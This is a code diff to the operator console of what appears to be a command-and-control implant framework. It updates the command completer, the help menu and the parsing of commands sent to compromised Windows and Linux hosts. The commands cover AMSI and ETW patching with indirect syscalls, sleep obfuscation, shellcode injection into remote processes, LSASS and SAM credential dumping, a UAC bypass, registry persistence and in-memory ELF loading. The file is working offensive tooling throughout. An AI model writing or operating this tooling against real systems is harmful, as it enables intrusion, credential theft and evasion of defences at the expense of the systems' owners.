@@ -3,8 +3,8 @@ from server import listener
 from server import ps_modules
 
 import re
-import shlex
 import json
+import shlex
 import random
 import subprocess
 from tabulate import tabulate
@@ -78,14 +78,20 @@ agent_completer_windows = NestedCompleter.from_nested_dict({
     'download': None,
     'upload': None,
     'pstree': None,
+    'modules': None,
     'checksec': None,
     'software': None,
     'clipboard': None,
     'screenshot': None,
     'audio': None,
-    'unhook': None,
-    'amsi': None,
-    'etw': None,
+    'patch': {
+        'amsi': None,
+        'etw': None
+    },
+    'memsleep': {
+        'none': None,
+        'ekko': None
+    },
     'persist': {
         'run': None,
         'spe': None
@@ -185,6 +191,7 @@ def print_agent_help(os):
     pstree                                 ->  show process tree
     checksec                               ->  check for security products
     software                               ->  check for installed software
+    modules                                ->  check process loaded modules
     
     --== Collection Stuff ==--
     clipboard                              ->  retrieve clipboard
@@ -194,14 +201,12 @@ def print_agent_help(os):
     --== Post Exploitation Stuff ==--
     lsass <method>                         ->  dump lsass.exe [methods:  direct,comsvcs] (elevation required)
     sam                                    ->  dump sam,security,system hives using reg.exe (elevation required)
-    shellc <raw-shellcode-file> <pid>      ->  inject shellcode to remote process
-    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single string using quotes)
-                                               warning: make sure the assembly doesn't call any exit function
+    shellc <raw-shellcode-file> <pid>      ->  inject shellcode to remote process using indirect syscalls
+    assembly <local-assembly> <args>       ->  execute .net assembly (pass all args as a single quoted string)
     
     --== Evasion Stuff ==--
-    unhook                                 ->  unhook ntdll.dll
-    amsi                                   ->  patch amsi out of the current process
-    etw                                    ->  patch etw out of the current process
+    patch <amsi/etw>                       ->  patch amsi/etw using indirect syscalls
+    memsleep <none/ekko>                   ->  sleep obfuscation technique
     
     --== Persistence Stuff ==--
     persist run <command> <key-name>       ->  set run key (will try first hklm, then hkcu)
@@ -212,8 +217,8 @@ def print_agent_help(os):
     uac sdclt <command> <keep/die>         ->  elevate session using the sdclt uac bypass technique
     
     --== Interaction stuff ==--
-    msgbox <title> <text>                  ->  pop a message box (blocking! waits for enter press)
-    speak <text>                           ->  speak using sapi.spvoice com interface
+    msgbox <title> <text>                  ->  pop a message box in a new thread
+    speak <text>                           ->  speak using 'sapi.spvoice' com interface
     
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
@@ -241,7 +246,7 @@ def print_agent_help(os):
     memfd <mode> <elf-file> <commandline>  ->  load elf in-memory using the memfd_create syscall
                                                implant mode: load the elf as a child process and return
                                                task mode: load the elf as a child process, wait on it, and get its output when it's done
-                                               (pass the whole commandline as a single string using quotes)
+                                               (pass the whole command line as a single quoted string)
     
     --== Communication Stuff ==--
     sleep <sleep-time> <jitter-%>          ->  change sleep time interval and jitter
@@ -307,7 +312,7 @@ def agent_screen_windows(agent_id):
                 }
 
             # handle ps_modules
-            elif re.fullmatch(r"\s*(pstree|software)\s*", command):
+            elif re.fullmatch(r"\s*(pstree|software|modules)\s*", command):
                 ps_module = command.replace(" ", "")
                 powershell_command = getattr(ps_modules, ps_module)
                 encoded_powershell_command = utils.encode_base_64(powershell_command)
@@ -403,19 +408,18 @@ def agent_screen_windows(agent_id):
                     "assembly_args": assembly_args
                 }
 
-            elif re.fullmatch(r"\s*unhook\s*", command):
+            elif re.fullmatch(r"\s*patch\s+(etw|amsi)\s*", command):
+                patch_func = shlex.split(re.sub(r"\s*patch\s+", "", command, 1))[0]
                 command_dict = {
-                    "command_type": "unhook"
+                    "command_type": "patch",
+                    "patch_func": patch_func
                 }
-
-            elif re.fullmatch(r"\s*amsi\s*", command):
+            
+            elif re.fullmatch(r"\s*memsleep\s+(none|ekko)\s*", command):
+                memsleep_technique = shlex.split(re.sub(r"\s*memsleep\s+", "", command, 1))[0]
                 command_dict = {
-                    "command_type": "amsi"
-                }
-
-            elif re.fullmatch(r"\s*etw\s*", command):
-                command_dict = {
-                    "command_type": "etw"
+                    "command_type": "memsleep",
+                    "memsleep_technique": memsleep_technique
                 }
 
             elif re.fullmatch(r"\s*persist\s+(run|spe)\s+.*", command):
